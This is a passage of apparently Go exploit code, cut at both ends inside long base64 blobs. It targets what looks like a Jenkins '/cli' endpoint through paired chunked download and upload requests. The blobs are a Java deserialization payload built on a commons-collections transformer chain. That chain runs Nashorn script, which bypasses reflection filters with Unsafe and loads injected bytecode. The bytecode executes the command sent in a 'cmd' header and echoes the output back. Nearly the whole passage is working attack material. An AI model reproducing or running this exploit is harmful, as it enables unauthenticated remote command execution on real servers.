xNQUFDc0FBQ2s0RE5nUVZCQzIrb2dLVUxSVUVNam9GR1FYSEFBYW5Bb0FaQmJZQUNCSUx0Z0FFVENzRXRnQUZLeGtGdGdBSFRTekdBS0VzdGdBSXRnQU1FZzIyQUE2WkFKSXNPZ1laQnJZQUNCSVBBYllBRURvSEdRY1pCZ0cyQUJGTkxMWUFDQklTQkwwQUUxa0RFaFJUdGdBUU9nY1pCeXdFdlFBVldRTVNGbE8yQUJIQUFCUTZDTHNBRjFtM0FCZ1NHYllBR2lvWkNMWUFHN1lBR3JZQUhEb0pHUWEyQUFnU0hRUzlBQk5aQXhJVVU3WUFFRG9IR1FjWkJnUzlBQlZaQXhJZVU3WUFFY0FBSHpvS0dRb1pDYllBSUtjQnpTekdBTGNzdGdBSXRnQU1FaUcyQUE2WkFLZ3N0Z0FJRWlJQnRnQWpPZ1laQml3QnRnQVJPZ2NaQjdZQUNCSVBBYllBRURvR0dRWVpCd0cyQUJGTkxMWUFDQklTQkwwQUUxa0RFaFJUdGdBUU9nWVpCaXdFdlFBVldRTVNGbE8yQUJIQUFCUTZDTHNBRjFtM0FCZ1NHYllBR2lvWkNMWUFHN1lBR3JZQUhEb0pHUWUyQUFnU0pBRzJBQkE2QmhrR0dRY0J0Z0FSVFN5MkFBZ1NKUUcyQUJBNkJoa0dMQUcyQUJIQUFCODZDaGtLR1FtMkFDQ25BUlVzeGdFTExMWUFDTFlBREJJbXRnQU9tUUQ4TERvR0dRYTJBQWdTSjdZQUJEb0hHUWNFdGdBRkdRY1pCcllBQnpvSUdRaTJBQWdTS0xZQUJEb0tHUW9FdGdBRkdRb1pDTFlBQnpvSnB3QWdPZ29aQ0xZQUNCSXF0Z0FFT2dzWkN3UzJBQVVaQ3hrSXRnQUhPZ2taQ2JZQUNCSVBBNzBBRTdZQUVCa0pBNzBBRmJZQUVUb0tHUW0yQUFnU0pBTzlBQk8yQUJBWkNRTzlBQlcyQUJFNkN4a0t0Z0FJRWhJRXZRQVRXUU1TRkZPMkFCQVpDZ1M5QUJWWkF4SVdVN1lBRWNBQUZEb01HUXUyQUFnU0t3TzlBQk8yQUJBWkN3TzlBQlcyQUJIQUFDdzZEYnNBRjFtM0FCZ1NHYllBR2lvWkRMWUFHN1lBR3JZQUhEb09HUTBaRHJZQUxiWUFMaGtOdGdBdnB3QUpoQVFCcC8xcnB3QUlUQ3UyQURDeEFBSUI4QUlMQWc0QUtRQUVBdEVDMUFBcEFBSUFVUUFBQVFZQVFRQUFBQTRBQkFBUUFBd0FFUUFSQUJJQUdRQVRBQ01BRkFBb0FCVUFMZ0FXQURZQUZ3QkFBQmdBUmdBWkFFNEFHZ0JaQUJzQVhnQWNBR1VBSFFCNEFCNEFld0FmQUlnQUlBQ1JBQ0VBcFFBaUFMa0FJd0RUQUNRQTZBQWxBUDBBSmdFRUFDY0JCd0FvQVJvQUtRRW1BQ29CTHdBckFUd0FMQUZGQUMwQldRQXVBVzBBTHdHSEFEQUJsQUF4QVowQU1nR3BBRE1CdFFBMEFid0FOUUcvQURZQjBnQTNBZFVBT0FIaEFEa0I1d0E2QWZBQVBRSDhBRDRDQWdBL0Fnc0FSQUlPQUVBQ0VBQkJBaHdBUWdJaUFFTUNLd0JGQWtRQVJnSmRBRWNDZ3dCSUFwOEFTUUs1QUVvQ3d3QkxBc2dBVEFMTEFCY0MwUUJSQXRRQVR3TFZBRkFDMlFCU0FGSUFBQUJ1QUFyL0FEa0FCUWNBVXdjQVZBY0FWUWNBQ2dFQUFQd0FGQWNBVmZzQXVQc0F0LzhBVGdBSkJ3QlRCd0JVQndCVkJ3QUtBUWNBVlFjQVZRY0FWQWNBVlFBQkJ3QlcvQUFjQndCVi93Q2ZBQVVIQUZNSEFGUUhBRlVIQUFvQkFBRC9BQVVBQVFjQVV3QUFRZ2NBVmdRQUFRQlhBRmdBQVFCUUFBQUN1d0FFQUFrQUFBRS9LOFlCT3hJeEs3WUFNcG9CTWhJenVBQTB0Z0ExVFN1MkFEWk1BVTRCT2dRc0VqZTJBRGlaQUVBckVqbTJBRGlaQUNBckVqcTJBRGlhQUJlN0FCZFp0d0FZSzdZQUdoSTd0Z0FhdGdBY1RBYTlBQlJaQXhJV1Uxa0VFanhUV1FVclV6b0Vwd0E5S3hJNXRnQTRtUUFnS3hJNnRnQTRtZ0FYdXdBWFdiY0FHQ3UyQUJvU1BiWUFHcllBSEV3R3ZRQVVXUU1TUGxOWkJCSS9VMWtGSzFNNkJMZ0FRQmtFdGdCQlRyc0FRbGt0dGdCRHR3QkVFa1cyQUVZNkJSa0Z0Z0JIbVFBTEdRVzJBRWluQUFVU01Ub0d1d0JDV1MyMkFFbTNBRVFTUmJZQVJqb0Z1d0FYV2JjQUdCa0d0Z0FhR1FXMkFFZVpBQXNaQmJZQVNLY0FCUkl4dGdBYXRnQWNPZ1laQmpvSExjWUFCeTIyQUVvWkI3QTZCUmtGdGdBd0dRVzJBRXM2QmkzR0FBY3R0Z0JLR1Fhd09nZ3R4Z0FITGJZQVNoa0l2eEpNc0FBRUFLQUJDd0VXQUNrQW9BRUxBUzhBQUFFV0FTUUJMd0FBQVM4Qk1RRXZBQUFBQWdCUkFBQUFmZ0FmQUFBQVZRQU5BRllBRmdCWEFCc0FXQUFkQUZrQUlBQmFBQ2tBV3dBN0FGd0FUd0JlQUdZQVlBQjRBR0VBakFCakFLQUFaZ0NwQUdjQXV3Qm9BTThBYVFEaEFHb0JCd0JyQVFzQWNBRVBBSEVCRXdCckFSWUFiQUVZQUcwQkhRQnVBU1FBY0FFb0FIRUJMQUJ1QVM4QWNBRTFBSEVCT1FCekFUd0FkUUJTQUFBQXhnQU8vZ0JQQndCWkJ3QmFCd0JiRmlVVC9BQXFCd0JjUVFjQVdmOEFMd0FIQndCVEJ3QlpCd0JaQndCYUJ3QmJCd0JjQndCWkFBRUhBRjMvQUFFQUJ3Y0FVd2NBV1FjQVdRY0FXZ2NBV3djQVhBY0FXUUFDQndCZEJ3QlovQUFUQndCWi93QUNBQVVIQUZNSEFGa0hBRmtIQUZvSEFGc0FBUWNBVnYwQUZRY0FWZ2NBV2Y4QUFnQUZCd0JUQndCWkJ3QlpCd0JhQndCYkFBRUhBRjcvQUFrQUNRY0FVd2NBV1FjQVdRY0FXZ2NBV3dBQUFBY0FYZ0FBL3dBQ0FBSUhBRk1IQUZrQUFBQUJBRjhBQUFBQ0FHQT0iOwpjbHogPSBkZWZpbmVDbGFzcyhiYXNlNjREZWNvZGVUb0J5dGUoY29kZSkpOwpjbHoubmV3SW5zdGFuY2UoKTt0AARldmFsdXEAfgAbAAAAAXEAfgAjc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHh1cQB+ABEAAAAuMCwCFG+45jPqJX+obcQh+hSyAgeCUfdzAhQHNQphZShm9A/JV5RBFnac2L8H2HQAA0RTQXNyABFqYXZhLmxhbmcuQm9vbGVhbs0gcoDVnPruAgABWgAFdmFsdWV4cAFweHNyADFvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuc2V0Lkxpc3RPcmRlcmVkU2V0/NOe9voc7VMCAAFMAAhzZXRPcmRlcnQAEExqYXZhL3V0aWwvTGlzdDt4cgBDb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLnNldC5BYnN0cmFjdFNlcmlhbGl6YWJsZVNldERlY29yYXRvchEP9GuWFw4bAwAAeHBzcgAVbmV0LnNmLmpzb24uSlNPTkFycmF5XQFUb1woctICAAJaAA5leHBhbmRFbGVtZW50c0wACGVsZW1lbnRzcQB+ABh4cgAYbmV0LnNmLmpzb24uQWJzdHJhY3RKU09O6IoT9PabP4ICAAB4cABzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAXcEAAAAAXQABWFzZGY5eHhzcQB+AB4AAAAAdwQAAAAAeHh0AAdhZGFkYWRhc3EAfgACc3EAfgAFdwQAAAACcQB+ABpxAH4ACXh0AARhc2RmcHg=")
		var resp *httpclient.HttpResponse
		var err error
		var wg = &sync.WaitGroup{}
		go func() {
			wg.Add(1)
			cfg := httpclient.NewPostRequestConfig("/cli")
			cfg.Header.Store("Session", session)
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Side", "download")
			cfg.Header.Store("Transfer-Encoding", "chunked")
			cfg.Header.Store("cmd", cmd)
			postDate := " "
			cfg.VerifyTls = false
			cfg.Data = fmt.Sprintf(postDate)
			resp, err = httpclient.DoHttpRequest(hostinfo, cfg)
			wg.Done()
		}()
		time.Sleep(time.Second * 3)
		cfg := httpclient.NewPostRequestConfig("/cli")
		cfg.Header.Store("Session", session)
		cfg.Header.Store("Content-type", "application/octet-stream")
		cfg.Header.Store("Side", "upload")
		cfg.Header.Store("Cache-Control", "no-cache")
		cfg.Header.Store("Transfer-Encoding", "chunked")
		cfg.Header.Store("cmd", cmd)
		cfg.VerifyTls = false
		bodyData, _ := base64.StdEncoding.DecodeString("rO0ABXNyAC9vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLlJlZmVyZW5jZU1hcBWUygOYSQjXAwAAeHB3EQAAAAAAAAABAD9AAAAAAAAQc3IAKGphdmEudXRpbC5jb25jdXJyZW50LkNvcHlPbldyaXRlQXJyYXlTZXRLvdCSkBVp1wIAAUwAAmFsdAArTGphdmEvdXRpbC9jb25jdXJyZW50L0NvcHlPbldyaXRlQXJyYXlMaXN0O3hwc3IAKWphdmEudXRpbC5jb25jdXJyZW50LkNvcHlPbldyaXRlQXJyYXlMaXN0eF2f1UarkMMDAAB4cHcEAAAAAnNyACpqYXZhLnV0aWwuY29uY3VycmVudC5Db25jdXJyZW50U2tpcExpc3RTZXTdmFB5vc/xWwIAAUwAAW10AC1MamF2YS91dGlsL2NvbmN1cnJlbnQvQ29uY3VycmVudE5hdmlnYWJsZU1hcDt4cHNyACpqYXZhLnV0aWwuY29uY3VycmVudC5Db25jdXJyZW50U2tpcExpc3RNYXCIRnWuBhFGpwMAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBwc3IAGmphdmEuc2VjdXJpdHkuU2lnbmVkT2JqZWN0Cf+9aCo81f8CAANbAAdjb250ZW50dAACW0JbAAlzaWduYXR1cmVxAH4ADkwADHRoZWFsZ29yaXRobXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdXIAAltCrPMX+AYIVOACAAB4cAAAKHSs7QAFc3IAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAAj9AAAAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAIGphdmF4LnNjcmlwdC5TY3JpcHRFbmdpbmVNYW5hZ2VyAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAALbmV3SW5zdGFuY2V1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABzcQB+ABN1cQB+ABgAAAABdAACanN0AA9nZXRFbmdpbmVCeU5hbWV1cQB+ABsAAAABdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwc3EAfgATdXEAfgAYAAAAAXQkHHRyeSB7CiAgbG9hZCgibmFzaG9ybjptb3ppbGxhX2NvbXBhdC5qcyIpOwp9IGNhdGNoIChlKSB7fQpmdW5jdGlvbiBnZXRVbnNhZmUoKXsKICB2YXIgdGhlVW5zYWZlTWV0aG9kID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5taXNjLlVuc2FmZSIpLmdldERlY2xhcmVkRmllbGQoJ3RoZVVuc2FmZScpOwogIHRoZVVuc2FmZU1ldGhvZC5zZXRBY2Nlc3NpYmxlKHRydWUpOyAKICByZXR1cm4gdGhlVW5zYWZlTWV0aG9kLmdldChudWxsKTsKfQpmdW5jdGlvbiByZW1vdmVDbGFzc0NhY2hlKGNsYXp6KXsKICB2YXIgdW5zYWZlID0gZ2V0VW5zYWZlKCk7CiAgdmFyIGNsYXp6QW5vbnltb3VzQ2xhc3MgPSB1bnNhZmUuZGVmaW5lQW5vbnltb3VzQ2xhc3MoY2xhenosamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5DbGFzcyIpLmdldFJlc291cmNlQXNTdHJlYW0oIkNsYXNzLmNsYXNzIikucmVhZEFsbEJ5dGVzKCksbnVsbCk7CiAgdmFyIHJlZmxlY3Rpb25EYXRhRmllbGQgPSBjbGF6ekFub255bW91c0NsYXNzLmdldERlY2xhcmVkRmllbGQoInJlZmxlY3Rpb25EYXRhIik7CiAgdW5zYWZlLnB1dE9iamVjdChjbGF6eix1bnNhZmUub2JqZWN0RmllbGRPZmZzZXQocmVmbGVjdGlvbkRhdGFGaWVsZCksbnVsbCk7Cn0KZnVuY3Rpb24gYnlwYXNzUmVmbGVjdGlvbkZpbHRlcigpIHsKICB2YXIgcmVmbGVjdGlvbkNsYXNzOwogIHRyeSB7CiAgICByZWZsZWN0aW9uQ2xhc3MgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamRrLmludGVybmFsLnJlZmxlY3QuUmVmbGVjdGlvbiIpOwogIH0gY2F0Y2ggKGVycm9yKSB7CiAgICByZWZsZWN0aW9uQ2xhc3MgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgic3VuLnJlZmxlY3QuUmVmbGVjdGlvbiIpOwogIH0KICB2YXIgdW5zYWZlID0gZ2V0VW5zYWZlKCk7CiAgdmFyIGNsYXNzQnVmZmVyID0gcmVmbGVjdGlvbkNsYXNzLmdldFJlc291cmNlQXNTdHJlYW0oIlJlZmxlY3Rpb24uY2xhc3MiKS5yZWFkQWxsQnl0ZXMoKTsKICB2YXIgcmVmbGVjdGlvbkFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKHJlZmxlY3Rpb25DbGFzcywgY2xhc3NCdWZmZXIsIG51bGwpOwogIHZhciBmaWVsZEZpbHRlck1hcEZpZWxkID0gcmVmbGVjdGlvbkFub255bW91c0NsYXNzLmdldERlY2xhcmVkRmllbGQoImZpZWxkRmlsdGVyTWFwIik7CiAgdmFyIG1ldGhvZEZpbHRlck1hcEZpZWxkID0gcmVmbGVjdGlvbkFub255bW91c0NsYXNzLmdldERlY2xhcmVkRmllbGQoIm1ldGhvZEZpbHRlck1hcCIpOwogIGlmIChmaWVsZEZpbHRlck1hcEZpZWxkLmdldFR5cGUoKS5pc0Fzc2lnbmFibGVGcm9tKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpKSkgewogICAgdW5zYWZlLnB1dE9iamVjdChyZWZsZWN0aW9uQ2xhc3MsIHVuc2FmZS5zdGF0aWNGaWVsZE9mZnNldChmaWVsZEZpbHRlck1hcEZpZWxkKSwgamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEudXRpbC5IYXNoTWFwIikuZ2V0Q29uc3RydWN0b3IoKS5uZXdJbnN0YW5jZSgpKTsKICB9CiAgaWYgKG1ldGhvZEZpbHRlck1hcEZpZWxkLmdldFR5cGUoKS5pc0Fzc2lnbmFibGVGcm9tKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpKSkgewogICAgdW5zYWZlLnB1dE9iamVjdChyZWZsZWN0aW9uQ2xhc3MsIHVuc2FmZS5zdGF0aWNGaWVsZE9mZnNldChtZXRob2RGaWx0ZXJNYXBGaWVsZCksIGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpLmdldENvbnN0cnVjdG9yKCkubmV3SW5zdGFuY2UoKSk7CiAgfQogIHJlbW92ZUNsYXNzQ2FjaGUoamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5DbGFzcyIpKTsKfQpmdW5jdGlvbiBzZXRBY2Nlc3NpYmxlKGFjY2Vzc2libGVPYmplY3QpewogICAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogICAgdmFyIG92ZXJyaWRlRmllbGQgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLnJlZmxlY3QuQWNjZXNzaWJsZU9iamVjdCIpLmdldERlY2xhcmVkRmllbGQoIm92ZXJyaWRlIik7CiAgICB2YXIgb2Zmc2V0ID0gdW5zYWZlLm9iamVjdEZpZWxkT2Zmc2V0KG92ZXJyaWRlRmllbGQpOwogICAgdW5zYWZlLnB1dEJvb2xlYW4oYWNjZXNzaWJsZU9iamVjdCwgb2Zmc2V0LCB0cnVlKTsKfQpmdW5jdGlvbiBkZWZpbmVDbGFzcyhieXRlcyl7CiAgdmFyIGNseiA9IG51bGw7CiAgdmFyIHZlcnNpb24gPSBqYXZhLmxhbmcuU3lzdGVtLmdldFByb3BlcnR5KCJqYXZhLnZlcnNpb24iKTsKICB2YXIgdW5zYWZlID0gZ2V0VW5zYWZlKCkKICB2YXIgY2xhc3NMb2FkZXIgPSBuZXcgamF2YS5uZXQuVVJMQ2xhc3NMb2FkZXIoamF2YS5sYW5nLnJlZmxlY3QuQXJyYXkubmV3SW5zdGFuY2UoamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubmV0LlVSTCIpLCAwKSk7CiAgdHJ5ewogICAgaWYgKHZlcnNpb24uc3BsaXQoIi4iKVswXSA+PSAxMSkgewogICAgICBieXBhc3NSZWZsZWN0aW9uRmlsdGVyKCk7CiAgICBkZWZpbmVDbGFzc01ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3NMb2FkZXIiKS5nZXREZWNsYXJlZE1ldGhvZCgiZGVmaW5lQ2xhc3MiLCBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiW0IiKSxqYXZhLmxhbmcuSW50ZWdlci5UWVBFLCBqYXZhLmxhbmcuSW50ZWdlci5UWVBFKTsKICAgIHNldEFjY2Vzc2libGUoZGVmaW5lQ2xhc3NNZXRob2QpOwogICAgLy8g57uV6L+HIHNldEFjY2Vzc2libGUgCiAgICBjbHogPSBkZWZpbmVDbGFzc01ldGhvZC5pbnZva2UoY2xhc3NMb2FkZXIsIGJ5dGVzLCAwLCBieXRlcy5sZW5ndGgpOwogICAgfWVsc2V7CiAgICAgIHZhciBwcm90ZWN0aW9uRG9tYWluID0gbmV3IGphdmEuc2VjdXJpdHkuUHJvdGVjdGlvbkRvbWFpbihuZXcgamF2YS5zZWN1cml0eS5Db2RlU291cmNlKG51bGwsIGphdmEubGFuZy5yZWZsZWN0LkFycmF5Lm5ld0luc3RhbmNlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnNlY3VyaXR5LmNlcnQuQ2VydGlmaWNhdGUiKSwgMCkpLCBudWxsLCBjbGFzc0xvYWRlciwgW10pOwogICAgICBjbHogPSB1bnNhZmUuZGVmaW5lQ2xhc3MobnVsbCwgYnl0ZXMsIDAsIGJ5dGVzLmxlbmd0aCwgY2xhc3NMb2FkZXIsIHByb3RlY3Rpb25Eb21haW4pOwogICAgfQogIH1jYXRjaChlcnJvcil7CiAgICBlcnJvci5wcmludFN0YWNrVHJhY2UoKTsKICB9ZmluYWxseXsKICAgIHJldHVybiBjbHo7CiAgfQp9CmZ1bmN0aW9uIGJhc2U2NERlY29kZVRvQnl0ZShzdHIpIHsKICB2YXIgYnQ7CiAgdHJ5IHsKICAgIGJ0ID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKS5uZXdJbnN0YW5jZSgpLmRlY29kZUJ1ZmZlcihzdHIpOwogIH0gY2F0Y2ggKGUpIHsKICAgIGJ0ID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKS5uZXdJbnN0YW5jZSgpLmdldERlY29kZXIoKS5kZWNvZGUoc3RyKTsKICB9CiAgcmV0dXJuIGJ0Owp9CnZhciBjb2RlPSJ5djY2dmdBQUFESUE2Z29BRlFCaEJ3QmlDQUJqQ2dBVEFHUUtBR1VBWmdvQUFnQm5DZ0JsQUdnS0FCVUFhUWdBYWdjQWF3Z0FiQW9BRXdCdENBQnVDZ0FVQUc4SUFIQUtBQk1BY1FvQWNnQnpDQUIwQndCMUJ3QjJCd0IzQ0FCNEJ3QjVDZ0FYQUdFSUFIb0tBQmNBZXdvQVRRQjhDZ0FYQUgwSUFINElBSDhIQUlBS0FCOEFnUWdBZ2dnQWd3b0FFd0NFQ0FDRkNBQ0dDQUNIQ0FDSUNBQ0pCd0NLQ0FDTENBQ01Cd0NOQ2dBVUFJNEtBQ3dBandvQUxBQ1FDZ0FwQUpFSUFKSUtBQlFBa3dnQWxBb0FsUUNXQ2dBVUFKY0tBQlFBbUFnQW1Rb0FGQUNhQ0FDYkNBQ2NDQUNkQ0FDZUNBQ2ZDQUNnQ0FDaENnQ2lBS01LQUtJQXBBY0FwUW9BcGdDbkNnQkNBS2dJQUtrS0FFSUFxZ29BUWdDckNnQkNBS3dLQUtZQXJRb0FwZ0N1Q2dBcEFIMElBSzhIQUxBQkFBWThhVzVwZEQ0QkFBTW9LVllCQUFSRGIyUmxBUUFQVEdsdVpVNTFiV0psY2xSaFlteGxBUUFOVTNSaFkydE5ZWEJVWVdKc1pRY0FzQWNBc1FjQWR3Y0FpZ0VBQkdWNFpXTUJBQ1lvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3djQWRnY0FzZ2NBc3djQXBRY0FlUWNBdEFFQUNsTnZkWEpqWlVacGJHVUJBQWhLUlRJdWFtRjJZUXdBVGdCUEFRQVFhbUYyWVM5c1lXNW5MMVJvY21WaFpBRUFESFJvY21WaFpFeHZZMkZzY3d3QXRRQzJCd0N4REFDM0FMZ01BTGtBdWd3QXV3QzhEQUM5QUw0QkFBVjBZV0pzWlFFQUUxdE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc0JBQVYyWVd4MVpRd0F2d0RBQVFBVFFYTjVibU5JZEhSd1EyOXVibVZqZEdsdmJnd0F3UURDQVFBS1oyVjBVbVZ4ZFdWemRBd0F3d0RFQndERkRBREdBTWNCQUFsblpYUklaV0ZrWlhJQkFBOXFZWFpoTDJ4aGJtY3ZRMnhoYzNNQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQVFhbUYyWVM5c1lXNW5MMDlpYW1WamRBRUFBMk50WkFFQUYycGhkbUV2YkdGdVp5OVRkSEpwYm1kQ2RXbHNaR1Z5QVFBQkNnd0F5QURKREFCWEFGZ01BTW9Bd0FFQURtZGxkRkJ5YVc1MFYzSnBkR1Z5QVFBRmRYUm1MVGdCQUJOcVlYWmhMMmx2TDFCeWFXNTBWM0pwZEdWeURBRExBTXdCQUE1SWRIUndRMjl1Ym1WamRHbHZiZ0VBRG1kbGRFaDBkSEJEYUdGdWJtVnNEQUROQU1RQkFBdG5aWFJTWlhOd2IyNXpaUUVBQ1dkbGRGZHlhWFJsY2dFQUIwTm9ZVzV1Wld3QkFCQjFibVJsY214NWFXNW5UM1YwY0hWMEFRQUlYMk5vWVc1dVpXd0JBQk5xWVhaaEwyeGhibWN2UlhoalpYQjBhVzl1QVFBR2RHaHBjeVF3QVFBUFoyVjBUM1YwY0hWMFUzUnlaV0Z0QVFBVWFtRjJZUzlwYnk5UGRYUndkWFJUZEhKbFlXME1BTTRBend3QTBBRFJEQURTQUU4TUFOTUFUd0VBQUF3QTFBRFZBUUFIYjNNdWJtRnRaUWNBMWd3QTF3QllEQURZQU1BTUFOa0F3QUVBQTNkcGJnd0EyZ0RiQVFBRWNHbHVad0VBQWkxdUFRQUZJQzF1SURRQkFBSXZZd0VBQlNBdGRDQTBBUUFDYzJnQkFBSXRZd2NBM0F3QTNRRGVEQUJYQU44QkFCRnFZWFpoTDNWMGFXd3ZVMk5oYm01bGNnY0FzZ3dBNEFEaERBQk9BT0lCQUFKY1lRd0E0d0RrREFEbEFPWU1BT2NBd0F3QTZBRGhEQURwQUU4QkFCQmpiMjF0WVc1a0lHNXZkQ0J1ZFd4c0FRQURTa1V5QVFBWGFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlJtbGxiR1FCQUJGcVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3dFQUUxdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQk5xWVhaaEwyeGhibWN2VkdoeWIzZGhZbXhsQVFBUVoyVjBSR1ZqYkdGeVpXUkdhV1ZzWkFFQUxTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMFpwWld4a093RUFEWE5sZEVGalkyVnpjMmxpYkdVQkFBUW9XaWxXQVFBTlkzVnljbVZ1ZEZSb2NtVmhaQUVBRkNncFRHcGhkbUV2YkdGdVp5OVVhSEpsWVdRN0FRQURaMlYwQVFBbUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME95bE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc0JBQWhuWlhSRGJHRnpjd0VBRXlncFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQkFBZG5aWFJPWVcxbEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFobGJtUnpWMmwwYUFFQUZTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXZ0VBQ1dkbGRFMWxkR2h2WkFFQVFDaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6dGJUR3BoZG1FdmJHRnVaeTlEYkdGemN6c3BUR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpEc0JBQmhxWVhaaEwyeGhibWN2Y21WbWJHVmpkQzlOWlhSb2IyUUJBQVpwYm5admEyVUJBRGtvVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3VzB4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzQkFBWmhjSEJsYm1RQkFDMG9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZwYkdSbGNqc0JBQWgwYjFOMGNtbHVad0VBQjNCeWFXNTBiRzRCQUJVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tWWUJBQkZuWlhSRVpXTnNZWEpsWkUxbGRHaHZaQUVBQ0dkbGRFSjVkR1Z6QVFBRUtDbGJRZ0VBQlhkeWFYUmxBUUFGS0Z0Q0tWWUJBQVZtYkhWemFBRUFEM0J5YVc1MFUzUmhZMnRVY21GalpRRUFCbVZ4ZFdGc2N3RUFGU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwV2dFQUVHcGhkbUV2YkdGdVp5OVRlWE4wWlcwQkFBdG5aWFJRY205d1pYSjBlUUVBQzNSdlRHOTNaWEpEWVhObEFRQUVkSEpwYlFFQUNHTnZiblJoYVc1ekFRQWJLRXhxWVhaaEwyeGhibWN2UTJoaGNsTmxjWFZsYm1ObE95bGFBUUFSYW1GMllTOXNZVzVuTDFKMWJuUnBiV1VCQUFwblpYUlNkVzUwYVcxbEFRQVZLQ2xNYW1GMllTOXNZVzVuTDFKMWJuUnBiV1U3QVFBb0tGdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRG1kbGRFbHVjSFYwVTNSeVpXRnRBUUFYS0NsTWFtRjJZUzlwYnk5SmJuQjFkRk4w